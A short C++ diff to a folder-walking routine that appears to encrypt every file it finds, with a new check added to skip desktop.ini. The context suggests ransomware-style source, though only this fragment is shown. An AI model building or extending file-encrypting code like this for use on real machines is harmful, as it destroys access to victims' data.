@@ -44,6 +44,12 @@ void exploreFolder(std::string path)
         }
         else
         {
+            if(file == "desktop.ini")
+            {
+                std::cout << "[ALERT] Skipping desktop.ini\n\n";
+                continue;
+            }
+
             std::cout << "[INFO] Encrypting " << path + file << "..." << std::endl;
             cryptFile(path + file);
         }
